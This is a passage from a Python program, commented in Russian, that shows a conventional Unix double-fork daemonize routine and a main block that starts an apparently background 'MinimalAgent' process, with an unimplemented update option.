            self.logger.error(f"Network scan failed: {str(e)}")
            return {"error": str(e)}


def daemonize():
    """Делает процесс демоном (только для Linux)"""
    try:
        # Первый fork
        pid = os.fork()
        if pid > 0:
            # Родительский процесс завершается
            sys.exit(0)
    except OSError:
        sys.exit(1)
    
    # Отсоединяемся от родительского окружения
    os.chdir('/')
    os.setsid()
    os.umask(0)
    
    try:
        # Второй fork
        pid = os.fork()
        if pid > 0:
            # Родительский процесс завершается
            sys.exit(0)
    except OSError:
        sys.exit(1)
    
    # Перенаправляем стандартные файловые дескрипторы
    sys.stdout.flush()
    sys.stderr.flush()
    
    with open('/dev/null', 'r') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    
    with open('/dev/null', 'a+') as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
    
    with open('/dev/null', 'a+') as f:
        os.dup2(f.fileno(), sys.stderr.fileno())


if __name__ == "__main__":
    # Получаем аргументы командной строки
    args = sys.argv[1:]
    
    # Проверяем, требуется ли обновление
    if len(args) > 0 and args[0] == "--update":
        # Реализация логики обновления
        pass
    else:
        # Запускаем в виде демона, если не указан флаг --no-daemon
        if len(args) == 0 or "--no-daemon" not in args:
            daemonize()
        
        # Запускаем агент
        agent = MinimalAgent()
        agent.start() 